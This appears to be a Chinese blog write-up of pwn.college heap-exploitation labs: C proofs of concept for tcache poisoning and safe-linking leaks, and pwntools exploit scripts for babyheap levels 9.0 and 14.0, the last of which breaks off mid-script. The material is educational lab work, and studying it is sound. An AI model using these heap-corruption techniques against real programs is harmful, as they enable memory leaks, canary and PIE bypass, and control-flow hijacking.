<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// size_t PROTECTED_PTR (size_t pos,size_t ptr)&#123;</span></span><br><span class="line"><span class="comment">//   return ((pos &gt;&gt; 12) ^ ptr);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">//结构体自动对齐到sizeof(tcache_entry) = 0x10</span></span><br><span class="line">  <span class="type">size_t</span> * next;</span><br><span class="line">  <span class="type">size_t</span> key;</span><br><span class="line">&#125;tcache_entry;</span><br><span class="line"></span><br><span class="line">tcache_entry fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;</span><br><span class="line">  <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">  fake_chunk.next = <span class="number">0xcafebabe</span>;</span><br><span class="line">  fake_chunk.key = <span class="number">0xdeadbeef</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk @ %p\n&quot;</span>,&amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);</span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">  chunk2[<span class="number">0</span>] = chunk1[<span class="number">0</span>] ^ (<span class="type">size_t</span>)(&amp;fake_chunk);</span><br><span class="line">  </span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  victim = (tcache_entry *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">  assert(victim == &amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# gcc safe_poison.c -o safe_poison -g -w</span><br><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# ./safe_poison    </span><br><span class="line">fake_chunk @ 0x55fe8ca46020</span><br><span class="line">victim = 0x55fe8ca46020</span><br></pre></td></tr></table></figure>
<h5 id="safe-linking-metadata-poisoning-memory-leak">[safe-linking]
metadata poisoning memory leak</h5>
<p>使用<code>tcache entry poisoning</code>之后一直<code>malloc</code>把假堆块拿出来</p>
<p>此时<code>fake_chunk.next</code>值会被“解密”然后挂载<code>tcache.entries[idx]</code></p>
<p>具体过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] =&gt; fake_chunk -&gt; fake_chunk.next</span><br></pre></td></tr></table></figure>
<p>当<code>fake_chunk</code>要从链条上拿走时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]	//ep就是桶子头</span><br><span class="line">e = *ep				//e 就是fake_chunk</span><br><span class="line">*ep = REVEAL_PTR(e-&gt;next);		//新ep指向</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR(fake_chunk-&gt;next)</span><br><span class="line">						= ( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next</span><br></pre></td></tr></table></figure>
<p>我们想要泄露的是<code>fake_chunk.next</code>,</p>
<p>现在我们知道的是<code>fake_chunk_addr</code></p>
<p>还需要知道一个<code>tcache-&gt;entries[tc_idx]</code></p>
<p>接下来再释放一个堆块<code>chunk0</code>进入<code>tcache</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0.next = PROTECT_PTR(chunk0_addr,tcache-&gt;entries[tc_idx])</span><br><span class="line">			= ( chunk0_addr &gt;&gt; 12 ) ^ [( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next]</span><br></pre></td></tr></table></figure>
<p>因此最终得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk.next = chunk0.next ^ (chunk0 &gt;&gt; 12) ^ (fake_chunk_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> flag_low;</span><br><span class="line">    <span class="type">size_t</span> flag_high;</span><br><span class="line">&#125;Secret;</span><br><span class="line"></span><br><span class="line">Secret secret=&#123;</span><br><span class="line">    .flag_low = <span class="number">0x0011223344556677</span>,</span><br><span class="line">    .flag_high = <span class="number">0x8899aabbccddeeff</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print_secret</span><span class="params">(Secret *s)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret @ %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_low = %p\n&quot;</span>, s-&gt;flag_low);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_high = %p\n&quot;</span>, s-&gt;flag_high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk0;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line">    <span class="type">size_t</span> chunk0_next;</span><br><span class="line">    <span class="type">size_t</span> chunk1_next;</span><br><span class="line">    <span class="type">size_t</span> chunk2_next;</span><br><span class="line">    <span class="type">size_t</span> ep;</span><br><span class="line">    <span class="type">size_t</span> leak;</span><br><span class="line"></span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1_next = chunk1[<span class="number">0</span>];         <span class="comment">//chunk1_next = page number</span></span><br><span class="line">    chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">    chunk2[<span class="number">0</span>] = chunk1_next ^ (<span class="type">size_t</span>)(&amp;secret);</span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">// remove secret.flag_high</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    chunk0_next = chunk0[<span class="number">0</span>];</span><br><span class="line">    ep = chunk1_next ^ chunk0_next;         <span class="comment">//tcache entry</span></span><br><span class="line">    leak = ep ^ ((<span class="type">size_t</span>)(&amp;secret)&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak = %p\n&quot;</span>, leak);</span><br><span class="line">    print_secret(&amp;secret);</span><br><span class="line">    assert(leak == secret.flag_low);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# gcc safe_metadata.c -o safe_metadata -g -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# ./safe_metadata</span><br><span class="line">leak = 0x11223344556677</span><br><span class="line">secret @ 0x5599e7a02030</span><br><span class="line">secret.flag_low = 0x11223344556677</span><br><span class="line">secret.flag_high = (nil)</span><br></pre></td></tr></table></figure>
<p>注意glibc2.35之后堆块的对齐要求, 堆块的地址必须是0x10对齐的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line">	<span class="comment">//MALLOC_ALIGN_MASK = 0xf</span></span><br></pre></td></tr></table></figure>
<p>但是glibc2.31及之前是可以对齐到0x8的</p>
<h3 id="glibc-2.35">glibc-2.35</h3>
<p>ubuntu22.04上使用glibc-2.35,其数据结构与算法基本上和glibc2.38相</p>
<h2 id="pwn.college">pwn.college</h2>
<table>
<thead>
<tr>
<th>ubuntu发行版</th>
<th>glibc版本</th>
<th>调试工具</th>
</tr>
</thead>
<tbody>
<tr>
<td>16.04</td>
<td>2.23</td>
<td>gef</td>
</tr>
<tr>
<td>18.04</td>
<td>2.27</td>
<td>pwndbg for ubuntu18.04</td>
</tr>
<tr>
<td>20.04</td>
<td>2.31</td>
<td>pwndbg for ubuntu20.04</td>
</tr>
<tr>
<td>22.04</td>
<td>2.35</td>
<td>pwndbg</td>
</tr>
</tbody>
</table>
<blockquote>
<p>pwndbg for ubuntu18.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 71c4e1d</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<p>pwndbg for ubuntu20.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 26ba400</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="level1---uaf">level1 - UAF</h3>
<h3 id="level2--">level2 -</h3>
<h3 id="level9.0">level9.0</h3>
<p><code>secret</code>位于 <code>0x427C72</code></p>
<p>然而<code>malloc</code>检查地址必须在<code>0x430000</code>之上</p>
<p>如此一来,
<strong>通过<code>UAF tcache poisoning</code>把<code>0x427C72</code>作为假堆块挂到<code>tcache</code>中,
然后<code>malloc</code>拿出来打印其内容</strong>的思路就失效了,
因为<code>malloc</code>不让我们拿出这个假堆块来</p>
<p>虽然我们拿不出假堆块来,但是投毒会传染给元数据</p>
<p><strong>具体来说:</strong></p>
<p>1.通过<code>UAF</code>对<code>tcache</code>中的真堆块投毒,使得
<strong>假堆块@0x427C72</strong> 进入<code>tcache</code></p>
<p>2.<code>malloc</code>拿出真堆块</p>
<p>3.<code>malloc</code>拿出假堆块,</p>
<p>此时假堆块的<code>next</code>值,就是<code>secret[0-7]</code></p>
<p>此时假堆块的<code>key</code>值,就是<code>secret[8-15]</code></p>
<p><code>tcache</code>元数据会继承 <strong>假堆块.next</strong>,</p>
<p>并且假堆块在被重新分配时,<code>key</code>值会被置零,也就是说<code>secret[8-15] = 0</code></p>
<p>4.重复上述步骤,但是这次<strong>假堆块@0x427C72 - 8</strong></p>
<p>如此<code>secret[0-7]</code>也会被置0</p>
<p>如此一来,我们根本不需要知道<code>secret</code>是多少,直接放零蛋</p>
<blockquote>
<p>glibc2.31中,tcache的堆块不会有对齐要求</p>
<p>同样的思路在glibc2.35上就更加困难了,一个是有safe-linking
,二个是tcache堆块必须对齐到0x10</p>
<p>glibc2.35中可以泄露低8字节,归零高8字节</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_level9.0&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;/challenge/babyheap_level9.0&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    size=<span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index,size = <span class="number">0</span></span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;You win! Here is your flag:\n&#x27;</span>)</span><br><span class="line">    flag = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    scanf(<span class="number">0</span>,p64(addr))</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x10</span>)          <span class="comment"># get fake_chunk out of tcache</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = puts(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x427C72</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_high = leak(secret_addr+8)       # no need to know secret_high which will be overwritten to zero by the next step</span></span><br><span class="line">leak(secret_addr)          <span class="comment"># secret_high will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line">leak(secret_addr - <span class="number">8</span>)      <span class="comment"># secret_low will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#secret was reset to 0 after 2 leak</span></span><br><span class="line">secret = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">send_flag(secret)</span><br></pre></td></tr></table></figure>
<h3 id="level14.0">level14.0</h3>
<p>程序中有一个<code>win</code>函数，可以<code>ret2text</code></p>
<p>但是程序开启了<code>pie</code>保护，因此需要先泄露<code>pie base</code></p>
<p>允许堆栈上溢出构造假堆块，并<code>free</code>进入<code>tcache</code>,</p>
<p>由于栈上有<code>canary</code>并且溢出长度有限,
因此需要利用假堆块进行泄露或者篡改返回地址</p>
<blockquote>
<p>buffer视角:</p>
<table>
<thead>
<tr>
<th></th>
<th>offset</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>低</td>
</tr>
<tr>
<td><strong>buffer</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td><strong>chunk_mem</strong></td>
<td><strong>+ 0x40</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>==buffer_end==</td>
<td>+ 0x7f</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x168</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody>
</table>
<p>堆块视角:</p>
<table>
<thead>
<tr>
<th>prev_size</th>
<th>- 0x10</th>
<th>低</th>
</tr>
</thead>
<tbody>
<tr>
<td>size</td>
<td>- 0x8</td>
<td></td>
</tr>
<tr>
<td><strong>chunkmem</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x58</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x128</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody>
</table>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usable_size = 0x130</span><br><span class="line">chunk_size = (0x130+0x10) | 1 = 0x141</span><br></pre></td></tr></table></figure>
<p>此时<code>chunkmem + 0x48</code>处是<code>main</code>栈帧中的<code>canary</code>所在地</p>
<p>此时<code>chunkmem + 0x58</code>处是<code>main</code>函数的返回地址,
正常情况下是<code>__libc_start_main+243 @ glibc</code>处</p>
<p>此时<code>chunkmem + 0x128</code>处是<code>__libc_start_main</code>函数返回地址,
正常情况下是<code>_start+46 @ babylevel14.0</code>处</p>
<p>正好两个地址一个可以泄露<code>libc_base</code>,
一个可以泄露<code>pie_base</code>, 当然,
本题中只需要泄露<code>pie_base</code></p>
<p>接下来就可以在<code>chunkmem</code>上溢出</p>
<p>综上</p>
<p>1.在堆栈上构造假堆块, 大小涵盖两个返回地址</p>
<p>2.下一次<code>malloc</code>拿到假堆块,
打印泄露<code>canary</code>和两个返回地址,
计算得到<code>pie_base</code></p>
<p>3.在假堆块上溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level14.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level14.0&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,n = <span class="number">6</span></span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(offset)</span><br><span class="line">  p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">  data = p.recv(n)</span><br><span class="line">  data = data[::-<span class="number">1</span>]</span><br><span class="line">  data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># data = int(data,16)</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 